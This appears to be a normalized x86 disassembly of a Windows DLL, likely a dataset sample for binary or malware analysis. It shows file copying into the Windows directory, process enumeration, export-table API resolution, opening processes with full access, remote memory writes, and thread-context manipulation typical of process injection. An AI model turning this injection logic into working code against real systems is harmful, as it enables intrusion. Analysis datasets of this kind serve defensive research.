lea edi [ ebp - 0xd6b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea ecx [ ebp - 0xd6c ]
push ecx
call [ GetWindowsDirectoryA@IAT ]
push rw-data
lea edx [ ebp - 0xd6c ]
push edx
call strcat
add esp 0x8
lea eax [ ebp - 0xd6c ]
push eax
call sub_1000263b
add esp 0x4
lea ecx [ ebp - 0xd6c ]
push ecx
call sub_10003f90
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x9f4 ] 0x0
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x9f2 ]
[ edi ]
stosw [ edi ]
push 0x103
lea eax [ ebp - 0x9f4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ GetModuleFileNameW@IAT ]
mov ecx 0xe
mov esi rw-data
lea edi [ ebp - 0xc40 ]
[ edi ] [ esi ]
mov ecx 0x74
xor eax eax
lea edi [ ebp - 0xc08 ]
[ edi ]
lea edx [ ebp - 0xc40 ]
push edx
lea eax [ ebp - 0x9f4 ]
push eax
call sub_10001052
add esp 0x8
mov [ ebp - 0xa34 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ DisableThreadLibraryCalls@IAT ]
jmp r-xdata
call sub_10002976
push 0x1
lea eax [ ebp - 0xd6c ]
push eax
lea ecx [ ebp - 0xe98 ]
push ecx
call [ CopyFileA@IAT ]
lea edx [ ebp - 0xd6c ]
push edx
call sub_10002777
add esp 0x4
mov [ ebp - 0x38c ] 0x3
sub esp 0x334
mov ecx 0xcd
lea esi [ ebp - 0x6b8 ]
mov edi esp
[ edi ] [ esi ]
call sub_100022ad
add esp 0x334
push 0x1
call [ ExitProcess@IAT ]
mov [ ebp - 0xfc4 ] 0x0
mov ecx 0x4a
xor eax eax
lea edi [ ebp - 0xfc3 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x12c
lea edx [ ebp - 0xd6c ]
push edx
lea eax [ ebp - 0xfc4 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
push 0x5c
lea ecx [ ebp - 0xfc4 ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
mov [ eax + 0x1 ] 0x0
push rw-data
lea edx [ ebp - 0xfc4 ]
push edx
call strcat
add esp 0x8
lea eax [ ebp - 0xfc4 ]
push eax
call sub_1000263b
add esp 0x4
lea ecx [ ebp - 0xfc4 ]
push ecx
lea edx [ ebp - 0xd6c ]
push edx
call [ rename@IAT ]
add esp 0x8
cmp [ ebp - 0xa34 ] 0x3c
jae r-xdata
mov [ ebp - 0xa30 ] 0x3c
mov [ ebp - 0xa2c ] 0x40
mov [ ebp - 0xa20 ] rw-data
mov [ ebp - 0xa1c ] rw-data
mov [ ebp - 0xa18 ] rw-data
mov [ ebp - 0xa14 ] 0x5
push rw-data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x7ec ] eax
push rw-data
mov eax [ ebp - 0x7ec ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0xa38 ] eax
lea ecx [ ebp - 0xa30 ]
push ecx
call [ ebp - 0xa38 ]
test eax eax
je r-xdata
mov edx [ ebp - 0xa34 ]
mov [ ebp + edx - 0xa30 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x9f8 ] 0x0
je r-xdata
mov ecx [ ebp - 0xa34 ]
add ecx 0x1
mov [ ebp - 0xa34 ] ecx
push 0xffffffff
mov edx [ ebp - 0x9f8 ]
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ ebp - 0x9f8 ]
push eax
call [ CloseHandle@IAT ]
sub_10003d90
push ebp
mov ebp esp
sub esp 0x30c
push 0x104
lea eax [ ebp - 0x104 ]
push eax
call [ GetSystemDirectoryA@IAT ]
push rw-data
lea ecx [ ebp - 0x104 ]
push ecx
call [ lstrcatA@IAT ]
lea edx [ ebp - 0x104 ]
push edx
call [ LoadLibraryA@IAT ]
mov [ rw-data ] eax
xor eax eax
cmp [ rw-data ] 0x0
setne al
mov esp ebp
pop ebp
retn
sub_10003e10
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10003e3f
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10003e3f
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10002ea0
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10003e3f
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10003e3f
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10003fb0
sub esp 0x8
push esi
push edi
mov edi [ esp + 0x14 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
call [ CreateFileA@IAT ]
mov esi [ esp + 0x18 ]
cmp eax 0xffffffff
mov [ esi + 0x200 ] eax
jne r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x0
push ecx
push eax
mov [ esp + 0x14 ] 0x0
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x8
retn
pop edi
mov eax 0x1
pop esi
add esp 0x8
retn
mov edx [ esp + 0x8 ]
mov ecx [ esi + 0x200 ]
mov eax [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
push 0x4000002
push 0x0
mov [ esi + 0x210 ] edx
push ecx
mov [ esi + 0x214 ] eax
call [ CreateFileMappingA@IAT ]
test eax eax
mov [ esi + 0x204 ] eax
je r-xdata
push 0x1ff
push edi
push esi
call sub_100049e0
mov edx [ esi + 0x204 ]
add esp 0xc
push 0x0
push 0x0
push 0x0
push 0x4
push edx
call [ MapViewOfFile@IAT ]
mov [ esi + 0x208 ] eax
sub_10004080
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
mov eax [ esi + 0x208 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x204 ]
mov ebx [ CloseHandle@IAT ]
cmp eax edi
je r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov [ esi + 0x208 ] edi
mov eax [ esi + 0x200 ]
cmp eax edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x210 ] edi
mov [ esi + 0x214 ] edi
pop edi
pop esi
mov eax 0x1
pop ebx
retn
cmp eax 0xffffffff
je r-xdata
push eax
call ebx
mov [ esi + 0x204 ] edi
push eax
call ebx
mov [ esi + 0x200 ] edi
sub_100040f0
sub esp 0x130
push ebx
xor ebx ebx
push esi
push ebx
push 0x2
mov [ esp + 0x18 ] 0x128
call CreateToolhelp32Snapshot
mov esi eax
test esi esi
jne r-xdata
push ebp
lea eax [ esp + 0xc ]
push edi
push eax
mov [ esp + 0x14 ] 0xffffffff
call [ GetCurrentProcessId@IAT ]
mov edi [ ProcessIdToSessionId@IAT ]
push eax
call edi
lea ecx [ esp + 0x18 ]
push ecx
push esi
call Process32First
test eax eax
je r-xdata
pop esi
pop ebx
add esp 0x130
retn
push esi
call [ CloseHandle@IAT ]
pop edi
pop ebp
mov eax ebx
pop esi
pop ebx
add esp 0x130
retn
mov ebp [ esp + 0x144 ]
lea eax [ esp + 0x18 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push ecx
call edi
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp edx eax
je r-xdata
lea edx [ esp + 0x3c ]
push ebp
push edx
call sub_10004b10
add esp 0x4
push eax
call sub_10004a30
add esp 0x8
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop ebp
mov eax ebx
pop esi
pop ebx
add esp 0x130
retn
mov ebx [ esp + 0x20 ]
sub_100041d0
sub esp 0x130
push ebp
push edi
xor ebp ebp
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x14 ]
mov [ esp + 0x10 ] ebp
[ edi ]
call sub_100041c0
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x128
push eax
push edi
call Process32First
test eax eax
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x130
retn
push ebx
lea ecx [ esp + 0xc ]
push esi
push ecx
mov [ esp + 0x14 ] 0xffffffff
call [ GetCurrentProcessId@IAT ]
mov ebx [ ProcessIdToSessionId@IAT ]
push eax
call ebx
mov esi [ esp + 0x144 ]
pop edi
pop ebp
add esp 0x130
retn
lea edx [ esp + 0x3c ]
push eax
push edx
push esi
call sub_10004a80
add esp 0xc
test eax eax
jne r-xdata
mov eax 0xf
lea eax [ esp + 0x18 ]
push eax
push edi
call Process32Next
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push ecx
call ebx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp edx eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
mov eax ebp
pop edi
pop ebp
add esp 0x130
retn
jmp r-xdata
mov ebp [ esp + 0x20 ]
push esi
call sub_10004ad0
add esp 0x4
cmp eax 0xf
jl r-xdata
sub_100042d0
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
call [ rw-data ]
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
push 0x10
push edx
push 0x0
push eax
mov [ esp + 0x24 ] 0x2
call [ rw-data ]
add esp 0x10
retn
sub_10004340
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
push 0x0
push 0x0
push esi
push edi
push 0x0
push 0x0
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push eax
push eax
push esi
push edi
push eax
push eax
push ebx
call sub_100046d0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_10004390
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
jne r-xdata
push 0x40
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
mov eax [ edi + 0x3c ]
mov eax [ eax + edi + 0x78 ]
add eax edi
cmp eax edi
je r-xdata
mov esi [ eax + 0x20 ]
mov ebp [ eax + 0x1c ]
mov ebx [ eax + 0x24 ]
add esi edi
add ebp edi
add ebx edi
mov ecx [ esi ]
lea eax [ ecx + edi ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push edx
push eax
call sub_10004a30
add esp 0x8
test eax eax
je r-xdata
xor ecx ecx
mov cx [ ebx ]
mov eax [ ebp + ecx * 4 ]
add eax edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
add esi 0x4
add eax edi
add ebx 0x2
test eax eax
jne r-xdata
sub_10004440
mov eax [ esp + 0xc ]
sub esp 0x40c
cmp eax 0xffffffff
push ebx
push esi
push edi
mov ebx eax
jne r-xdata
xor edi edi
cmp ebx edi
mov [ esp + 0xc ] edi
je r-xdata
mov eax [ esp + 0x41c ]
push eax
call sub_100042c0
add esp 0x4
mov ebx eax
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x40c
retn
push 0x400
lea ecx [ esp + 0x14 ]
push edi
push ecx
call sub_10004990
mov edx [ esp + 0x42c ]
push 0x3ff
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_100049e0
add esp 0x18
push rw-data
call [ GetModuleHandleA@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
push rw-data
push esi
call sub_10004390
push rw-data
mov [ esp + 0x418 ] eax
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
cmp [ rw-data ] edi
je r-xdata
push rw-data
push esi
call sub_10004390
mov [ rw-data ] eax
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
lea ecx [ esp + 0xc ]
push ebp
push ecx
push 0x20
mov [ esp + 0x41c ] eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
mov edx [ esp + 0x10 ]
push rw-data
push edx
call sub_100042d0
add esp 0x8
push ebx
push edi
push 0x1f0fff
call [ rw-data ]
mov esi eax
cmp esi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ CloseHandle@IAT ]
test eax eax
pop ebp
je r-xdata
push 0x408
push esi
call sub_10004420
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
test esi esi
je r-xdata
push eax
call ebx
push 0x0
lea eax [ esp + 0x18 ]
push 0x408
push eax
push ebp
push esi
call [ rw-data ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x40c
retn
push esi
call ebx
push 0x3e8
push esi
call sub_10004420
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push 0x0
push 0x3e8
push sub_10004320
push ebx
push esi
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x42c ]
test eax eax
je r-xdata
push 0x0
push 0x0
push ebp
push ebx
push 0x0
push 0x0
push esi
call [ rw-data ]
mov edi eax
neg edi
sbb edi edi
neg edi
push ebp
push ebx
push esi
call sub_10004340
add esp 0xc
mov edi eax
jmp r-xdata
sub_100046d0
sub esp 0x310
push ebx
push ebp
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov esi eax
push rw-data
push esi
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
push rw-data
push esi
mov [ rw-data ] eax
call sub_10004390
mov ebp eax
mov ecx 0xb2
xor eax eax
lea edi [ esp + 0x58 ]
mov [ esp + 0x54 ] 0x10007
mov esi [ esp + 0x324 ]
[ edi ]
or al 0xff
mov ebx 0x1000
mov cl 0x8b
mov [ esp + 0x19 ] al
mov [ esp + 0x1f ] al
mov [ esp + 0x23 ] al
push 0x40
lea eax [ esp + 0x18 ]
xor edi edi
mov [ esp + 0x1c ] cl
mov [ esp + 0x1f ] cl
push ebx
push eax
lea ecx [ esp + 0x3c ]
push edi
push ecx
push esi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] ebx
mov [ esp + 0x28 ] edi
mov [ esp + 0x32 ] 0x55
mov [ esp + 0x34 ] 0xec
mov [ esp + 0x35 ] 0x51
mov [ esp + 0x36 ] 0x53
mov [ esp + 0x38 ] 0xd0
mov [ esp + 0x39 ] 0x59
mov [ esp + 0x3a ] 0x50
mov [ esp + 0x3c ] 0xd1
mov [ esp + 0x3d ] 0x90
mov [ esp + 0x48 ] edi
mov [ esp + 0x2c ] ebx
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x310
retn 0x1c
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x1c ]
push 0xe
push eax
push ecx
push esi
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
push 0x4
lea edx [ esp + 0x18 ]
push 0x2000
push edx
lea eax [ esp + 0x1c ]
push edi
push eax
push esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x2c ] 0x10000
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x50 ] ecx
push 0x4
lea edx [ eax + ecx ]
push ebx
mov [ esp + 0x50 ] edx
mov edx [ esp + 0x34 ]
sub eax edx
add edx ebx
mov [ esp + 0x34 ] edx
lea edx [ esp + 0x18 ]
lea eax [ ecx + eax - 0x1000 ]
lea ecx [ esp + 0x34 ]
push ecx
push edi
push edx
push esi
mov [ esp + 0x28 ] eax
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] eax
push ecx
lea edx [ esp + 0x18 ]
push 0x104
lea eax [ esp + 0x18 ]
push edx
push eax
push esi
mov [ esp + 0x28 ] ebx
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x4c ]
lea ecx [ esp + 0x54 ]
sub eax ebx
push ecx
mov [ esp + 0x50 ] eax
call [ GetCurrentThread@IAT ]
push eax
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x334 ]
mov [ esp + 0x118 ] edx
mov edx [ esp + 0x330 ]
mov [ esp + 0x10c ] eax
mov [ esp + 0xf8 ] ecx
lea eax [ esp + 0x40 ]
mov [ esp + 0x104 ] edx
push 0x1
lea ecx [ esp + 0x58 ]
push eax
lea edx [ esp + 0x40 ]
push ecx
push edx
push esi
push edi
lea eax [ esp + 0x40 ]
push 0x1f03ff
push eax
mov [ esp + 0x120 ] ebp
mov [ esp + 0x11c ] edi
call [ rw-data ]
cmp eax 0x80000000
jae r-xdata
mov eax [ esp + 0x33c ]
cmp eax edi
je r-xdata
test [ esp + 0x338 ] 0x4
jne r-xdata
mov ecx [ esp + 0x3c ]
mov [ eax ] ecx
mov edx [ esp + 0x28 ]
push edi
push edx
call [ rw-data ]
sub_10004990
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push esi
call eax
add esp 0xc
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_100049e0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
push esi
call eax
add esp 0xc
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10004a30
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push edi
call eax
add esp 0x8
pop edi
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10004a80
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push esi
push edi
call eax
add esp 0xc
pop edi
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10004ad0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push esi
call eax
add esp 0x4
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10004b10
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push esi
call eax
add esp 0x4
pop esi
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_10004b50
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
push esi
push edi
mov edi [ esp + 0x48 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] eax
mov eax [ edi ]
push 0x38
lea ecx [ esp + 0xc ]
push rw-data
push ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_10004da0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x38
retn
lea edx [ esp + 0x8 ]
push 0x4
push edx
call sub_10004dc0
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x8 ]
push edx
mov [ edi ] ecx
call sub_10004c40
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
call sub_10004c40
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
add esp 0x38
retn
sub_10004bf0
mov eax [ esp + 0x4 ]
xor edx edx
cmp eax edx
je r-xdata
mov eax 0xfffffffe
retn
mov ecx [ eax + 0x1c ]
cmp ecx edx
je r-xdata
push esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] edx
mov esi [ ecx + 0xc ]
push edx
neg esi
sbb esi esi
push eax
and esi 0x7
mov [ ecx ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_100051f0
add esp 0xc
xor eax eax
pop esi
retn
sub_10004c40
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ esi + 0x1c ] 0x0
xor eax eax
pop esi
retn
push esi
push eax
call sub_10006020
add esp 0x8
sub_10004c90
mov eax [ esp + 0xc ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
mov eax 0xfffffffa
pop esi
retn
mov al [ eax ]
mov cl [ rw-data ]
cmp al cl
jne r-xdata
cmp [ esp + 0x18 ] 0x38
jne r-xdata
mov esi [ esp + 0xc ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] edi
cmp eax edi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
cmp [ esi + 0x24 ] edi
jne r-xdata
mov [ esi + 0x20 ] sub_10006190
mov [ esi + 0x28 ] edi
mov ecx [ esi + 0x28 ]
push 0x18
push 0x1
push ecx
call [ esi + 0x20 ]
add esp 0xc
cmp eax edi
mov [ esi + 0x1c ] eax
jne r-xdata
mov [ esi + 0x24 ] sub_100061b0
mov ecx [ esp + 0x10 ]
mov [ eax + 0x14 ] edi
mov edx [ esi + 0x1c ]
cmp ecx edi
mov [ edx + 0xc ] edi
jge r-xdata
pop edi
mov eax 0xfffffffc
pop esi
retn
cmp ecx 0x8
jl r-xdata
mov eax [ esi + 0x1c ]
neg ecx
mov [ eax + 0xc ] 0x1
push esi
call sub_10004c40
add esp 0x4
mov eax 0xfffffffe
pop edi
pop esi
retn
cmp ecx 0xf
jg r-xdata
mov edx [ esi + 0x1c ]
mov eax 0x1
shl eax cl
mov [ edx + 0x10 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ ecx + 0xc ]
neg edx
sbb edx edx
push eax
not edx
and edx sub_10006060
push edx
push esi
call sub_10005270
mov ecx [ esi + 0x1c ]
add esp 0xc
mov [ ecx + 0x14 ] eax
mov edx [ esi + 0x1c ]
push esi
cmp [ edx + 0x14 ] edi
jne r-xdata
call sub_10004bf0
add esp 0x4
xor eax eax
pop edi
pop esi
retn
call sub_10004c40
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
retn
sub_10004dc0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
xor ebx ebx
cmp edx 0x4
mov edi 0xfffffffb
setne bl
dec ebx
mov ebp 0x5
and ebx 0xfffffffb
mov [ esp + 0x18 ] ebx
jmp [ ecx * 4 + jump_table_100051b8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x14 ]
push edi
push esi
push ecx
call sub_10005310
mov edi eax
add esp 0xc
cmp edi 0xfffffffd
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
dec ecx
xor edx edx
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
inc ecx
mov edi ebx
mov [ esi + 0x8 ] ecx
mov ecx [ esi ]
mov dl [ ecx ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0x1c ]
mov edx [ esi ]
mov ecx [ eax + 0x4 ]
and ecx 0xf
inc edx
cmp cl 0x8
mov [ esi ] edx
je r-xdata
dec eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
mov edi ebx
mov ebx [ esi + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
xor edx edx
mov ebp 0x1f
mov cl [ eax ]
inc eax
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
shl eax 0x8
add eax ecx
div ebp
test edx edx
je r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
dec eax
mov edx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
